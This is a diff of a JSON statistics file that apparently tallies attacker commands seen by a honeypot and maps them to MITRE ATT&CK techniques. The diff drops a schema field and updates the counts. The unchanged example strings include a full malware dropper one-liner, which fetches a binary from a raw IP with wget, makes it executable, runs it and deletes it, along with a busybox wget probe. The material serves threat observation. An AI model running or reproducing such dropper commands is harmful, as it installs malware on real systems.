@@ -1,5 +1,4 @@
 {
-  "schema_version": "1.0",
   "techniques": [
     {
       "id": "T1027",
@@ -25,7 +24,7 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 2319,
+      "count": 2331,
       "distinct_ips": 134,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips",
@@ -42,7 +41,7 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 1393,
+      "count": 1405,
       "distinct_ips": 118,
       "examples": [
         "/bin/busybox wget; /bin/busybox STC",
@@ -152,6 +151,6 @@
       ]
     }
   ],
-  "total_commands": 179109,
-  "matched_commands": 77621
+  "total_commands": 179282,
+  "matched_commands": 77633
 }
